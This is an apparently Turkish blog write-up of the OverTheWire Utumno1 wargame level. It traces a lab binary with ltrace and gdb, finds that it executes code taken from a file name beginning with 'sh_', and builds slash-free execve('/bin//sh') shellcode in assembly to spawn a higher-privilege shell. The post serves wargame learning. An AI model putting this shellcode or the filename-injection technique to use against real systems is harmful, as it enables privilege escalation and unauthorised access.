---
layout: post
title: "Overthewire - Utumno0 Çözümü"
subtitle: "Shellcode mevzuları"
date: 2019-08-20 19:20:13 +0300
background: '/img/posts/bg.png'
---

# Overthewire Çözümleri - Utumno1

## İpucu
- Shellcode kurnazlıkları

## Çözüm

Programı çalıştırdığımızda hiçbir çıktı vermiyor. **ltrace** ile çalıştırıp sonuca bakalım.

```
__libc_start_main(0x80484a5, 1, 0xffffd674, 0x8048530 <unfinished ...>
exit(1 <no return ...>
+++ exited (status 1) +++
```

Bir de arguman vererek deneyelim.

```sh
__libc_start_main(0x80484a5, 2, 0xffffd674, 0x8048530 <unfinished ...>
opendir("asd")                                           = 0
exit(1 <no return ...>
+++ exited (status 1) +++
```

Gördüğünüz üzere "asd" dosyasını açmaya çalıştı. Hemen kendimize bir dosya oluşturalım ve orada programı denemeye devam edelim.

```sh
cd `mktemp -d`
ltrace /utumno/utumno1 /tmp/tmp.OIbeV24uHn
```

Çıktı:

```sh
__libc_start_main(0x80484a5, 2, 0xffffd664, 0x8048530 <unfinished ...>
opendir("/tmp/tmp.OIbeV24uHn")                           = 0x804a008
readdir(0x804a008)                                       = 0x804a024
strncmp("sh_", ".", 3)                                   = 69
readdir(0x804a008)                                       = 0x804a034
strncmp("sh_", "..", 3)                                  = 69
readdir(0x804a008)                                       = 0
+++ exited (status 0) +++
```

Gördüğünüz üzere program "sh_" adında bir dosya arıyor. Oluşturalım.

```sh
touch sh_
ltrace /utumno/utumno1 /tmp/tmp.OIbeV24uHn
```

Çıktı:

```sh
...
strncmp("sh_", "sh_", 3)                                 = 0
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

Segmentation fault aldık. Artık **gdb**'ye geçmenin zamanı geldi.

**main** fonksiyonunu disassemble ederek analize başlayalım.

```sh
disas main
```

Çıktı:

```asm
...
   0x080484f9 <+84>:	mov    eax,DWORD PTR [ebp-0x8]
   0x080484fc <+87>:	add    eax,0xb
   0x080484ff <+90>:	add    eax,0x3
   0x08048502 <+93>:	push   eax
   0x08048503 <+94>:	call   0x804848b <run>
...
```

Run fonksiyonuna bakalım.

```asm
   0x0804848b <+0>:	push   ebp
   0x0804848c <+1>:	mov    ebp,esp
   0x0804848e <+3>:	sub    esp,0x4
   0x08048491 <+6>:	lea    eax,[ebp-0x4]
   0x08048494 <+9>:	add    eax,0x8
   0x08048497 <+12>:	mov    DWORD PTR [ebp-0x4],eax
   0x0804849a <+15>:	mov    eax,DWORD PTR [ebp-0x4]
   0x0804849d <+18>:	mov    edx,DWORD PTR [ebp+0x8]
   0x080484a0 <+21>:	mov    DWORD PTR [eax],edx
   0x080484a2 <+23>:	nop
   0x080484a3 <+24>:	leave  
   0x080484a4 <+25>:	ret 
```

**run** fonksiyonunda dikkatimi çeken ilk şey register'ların ve stack'in değerlerini değiştirmek dışında hiçbir şey yapılmıyor. Yani program stack'i **ret** çalıştığında return adresinden farklı bir yere dönecek şekilde ayarlıyor olabilir.

Neler olduğunu anlamak için **0x080484fc** ve **0x080484a3** adreslerine 
breakpoint koyup çalıştıralım.

```
break *0x080484fc
break *0x080484a3
r `pwd`
```

İlk breakpoint'ten **run** fonksiyonuna kadar **eax**'in değerlerine bakalım.

```
(gdb) i r eax
eax            0x804a054	134520916
(gdb) x/s $eax
0x804a054:	"\225"
(gdb) ni
0x080484ff	49	in utumno1.c
(gdb) x/s $eax
0x804a05f:	"sh_"
(gdb) ni
0x08048502	49	in utumno1.c
(gdb) x/s $eax
0x804a062:	""
(gdb) 
```

Görüldüğü üzere öncelikle "sh_"'ın, sonrasında da "sh_"'ın 3 karakter sağının adresi **eax**'e atılıyor. Artık **run** fonksiyonuna verilen parametreyi bildiğimize göre devam edelim.

```
(gdb) x/8wx $esp
0xffffd590:	0xffffd598	0xffffd5a8	0x0804a062	0x0804a062
0xffffd5a0:	0x0804a054	0x0804a008	0x00000000	0xf7e2a286
(gdb) ni
0x080484a4	27	in utumno1.c
(gdb) ni
0x0804a062 in ?? ()
```

Aynen tahmin ettiğimiz gibi, program çağrıldığı adrese dönmek yerine
**0x0804a062** adresine dönüyor. Hatırlarsanız ilk breakpoint'te **eax** in değeri **0x804a054** idi. Sonrasında program bu değer üzerine **0xb** ve **0x3** ekliyordu. 

**0x804a054** + **0xb** + **0x3** = **0x804a062**

Demek ki program öncelikle ismi **sh_** ile başlayan bir dosya arıyor, sonra da bu dosyanın adını 3. karakterden itibaren çalıştırıyor. 

O zaman biz de bu dosyanın ismine 3. karakterden itibaren **shellcode** koyup **/bin/sh** ı çalıştırabiliriz.

Çok beğenerek okuduğum "Hacking the art of exploitation" kitabından alıntılayarak shellcode'umuzu anlatacağım.

```
BITS 32

xor eax, eax     ; eax'i sıfır yap
push eax         ; stack'e stringi sonlandırmak için \0 at
push 0x68732f2f  ; stack'e "//sh" at
push 0x6e69622f  ; stack'e "/bin" at
mov ebx, esp     ; esp'den "/bin//sh" adresini alıp ebp'e koy
push eax         ; stack'e tekrar 0 at
mov edx, esp     ; envp değişkeni için boş bir array veriyoruz
push ebx         ; string adresini stack'e at
mov ecx, esp     ; argv arrayini ecx'e taşıyoruz
mov al, 11       ; syscall 11
int 0x80
```

Fakat yukarıda gördüğümüz kodu derleyip dosya oluşturmaya çalıştığımızda şu hatayı alıyoruz:

```sh
nasm code
touch sh_`cat nasm.out`
```

Çıktı:

```
touch: cannot touch 'sh_1'$'\300''Ph//shh/bin'$'\211\343''P'$'\211\342''S'$'\211\341\260\v''̀': No such file or directory
```

Çıktıda görebiliriz ki "/" karakteri var ve bunun bir dosya ismi değil de dosya yolu olduğunu zannettiğinden sistem dosya bulunamadı hatası veriliyor. Linux sistemlerinde dosya adı "/" içeremiyor.

Bunu çok basit bir yöntemle atlatabiliriz. Düşünürsek derlenmiş kodumuzun "/" karakterini barındırmasının sebebi **push 0x68732f2f** ve **push 0x6e69622f** satırları. Biz **2f**'i şu şekilde yazıyla belirtmeden de stack'e koyabiliriz.

```
mov eax, 0x57621e1e
add eax, 0x11111111
push eax
```

Yaptığımız şey **0x68732f2f**'nın **0x11111111** eksiğini **eax**'e atıp sonrasında da **eax**'in değerini **0x11111111** arttırmak, sonra da onu stack'e atmak. Böylece aynı değeri elde etmiş oluyoruz.

Kodun tamamı:

```asm
BITS 32

xor eax, eax
push eax
mov eax, 0x57621e1e
add eax, 0x11111111
push eax
mov eax, 0x5d58511e
add eax, 0x11111111
push eax
xor eax, eax   ; eax'i tekrardan sıfırladık
mov ebx, esp
push eax
mov edx, esp
push ebx
mov ecx, esp
mov al, 11
int 0x80
```

```sh
nasm code
touch sh_`cat nasm.out`
/utumno/utumno1 /tmp/tmp.OIbeV24uHn
```

Sonuç:

```sh
$ whoami
utumno2
```

Burada da shellcode yazmayı biliyor olmanın önemini gördük. Maalesef düz bir mantıkla yazılan assembly kodları çoğu zaman null karakter dediğimiz **00** karakterini içerdiğinden shellcode yazmak ayrı bir özen gerektiriyor.

## Kaynaklar

Kitap: **Hacking- The Art of Exploitation**